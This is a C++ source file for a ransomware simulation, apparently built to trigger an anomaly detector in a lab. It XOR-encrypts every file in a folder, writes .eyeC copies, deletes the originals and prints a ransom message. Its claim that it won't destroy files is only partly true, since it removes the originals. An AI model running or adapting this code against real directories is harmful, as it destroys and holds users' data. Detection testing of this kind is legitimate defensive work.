/**
 * @file        ransom_sim.cpp
 * @project     Maelstrom-Breach (v1.0)
 * @description Safe Ransomware Simulation. Encrypts a dummy directory.
 * @warning     ONLY RUN IN THE LAB ENVIRONMENT.

 * This program simulates the behavior of ransomware (MITRE T1486). It won't actually destroy your files (it's a safe simulation), but it will read each file in a target folder, encrypt them (simple XOR), and rename them with a .eyeC extension.
 * Why is this important? This generates a spike in system read and write calls that Sentinel-Trace can detect as an anomaly.
 */

#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>

namespace fs = std::filesystem;

void encryptFile(const std::string& filePath) {
    std::ifstream inFile(filePath, std::ios::binary);
    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), (std::istreambuf_iterator<char>()));
    inFile.close();

    // Simple XOR Encryption (Simulating malicious activity)
    for (char &c : buffer) {
        c ^= 0x42; 
    }

    std::ofstream outFile(filePath + ".eyeC", std::ios::binary);
    outFile.write(buffer.data(), buffer.size());
    outFile.close();

    fs::remove(filePath); // Delete original
    std::cout << "[!] Encrypted: " << filePath << std::endl;
}

int main() {
    std::string targetDir = "./target_data"; // Create this dir for the demo

    if (!fs::exists(targetDir)) {
        std::cerr << "[-] Error: Target directory for simulation not found." << std::endl;
        return 1;
    }

    std::cout << "\033[1;31m[🌪️] MAELSTROM RANSOMWARE SIMULATION STARTED\033[0m" << std::endl;

    for (const auto& entry : fs::directory_iterator(targetDir)) {
        if (entry.is_regular_file()) {
            encryptFile(entry.path().string());
        }
    }

    std::cout << "\033[1;31m[!] Files held for ransom. Check .eyeC extensions.\033[0m" << std::endl;
    return 0;
}